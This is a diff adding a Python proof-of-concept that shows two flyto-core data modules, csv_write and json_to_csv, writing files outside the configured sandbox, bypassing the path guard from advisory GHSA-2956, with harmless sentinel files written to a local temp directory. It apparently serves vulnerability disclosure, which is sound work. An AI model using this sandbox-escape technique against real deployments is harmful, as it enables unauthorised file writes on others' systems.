@@ -1,0 +1,29 @@
+"""PoC: arbitrary file write via unguarded sibling write modules (incomplete fix of GHSA-2956).
+Run: FLYTO_SANDBOX_DIR is set to the intended confinement; the modules write OUTSIDE it."""
+import os, sys, asyncio, tempfile
+# Point FLYTO_SRC at a local flyto-core checkout (the `src` dir). Defaults to ./flyto-core/src.
+FLYTO_SRC = os.environ.get("FLYTO_SRC", os.path.join(os.path.dirname(__file__), "flyto-core", "src"))
+sys.path.insert(0, FLYTO_SRC)
+_T = tempfile.mkdtemp(prefix="flyto_poc_")
+# The intended confinement dir; the write modules escape it.
+SBX = os.environ.setdefault('FLYTO_SANDBOX_DIR', os.path.join(_T, "sandbox"))
+os.makedirs(SBX, exist_ok=True)
+# Sentinel targets deliberately OUTSIDE the sandbox (a sibling temp dir, still local & benign).
+_OUTDIR = tempfile.mkdtemp(prefix="flyto_outside_")
+OUT = os.path.join(_OUTDIR, "flyto_PWNED_OUTSIDE.csv"); OUT2 = os.path.join(_OUTDIR, "flyto_PWNED_json.csv")
+from core.utils import validate_path_with_env_config, PathTraversalError
+try:
+    validate_path_with_env_config(OUT); print("[guard] UNEXPECTED allow")
+except PathTraversalError:
+    print("[guard] GHSA-2956 guard validate_path_with_env_config() REJECTS out-of-sandbox path")
+async def call(W, p): return await W(p, {}).execute()
+from core.modules.atomic.data.csv_write import csv_write
+from core.modules.atomic.data.json_to_csv import json_to_csv
+r1 = asyncio.run(call(csv_write, {'file_path': OUT, 'data':[{'pwn':'SENTINEL_CSV'}]}))
+r2 = asyncio.run(call(json_to_csv, {'input_data':[{'pwn':'SENTINEL_JSON'}], 'output_path': OUT2}))
+for tag,out in [('data.csv.write',OUT),('data.json_to_csv',OUT2)]:
+    inside = os.path.realpath(out).startswith(os.path.realpath(SBX))
+    print(f"[{tag}] wrote={os.path.exists(out)} inside_sandbox={inside} -> {out}")
+ok = os.path.exists(OUT) and not os.path.realpath(OUT).startswith(os.path.realpath(SBX))
+print("BUG CONFIRMED (arbitrary write outside sandbox)" if ok else "NOT CONFIRMED")
+print("  sample content:", open(OUT).read().strip())
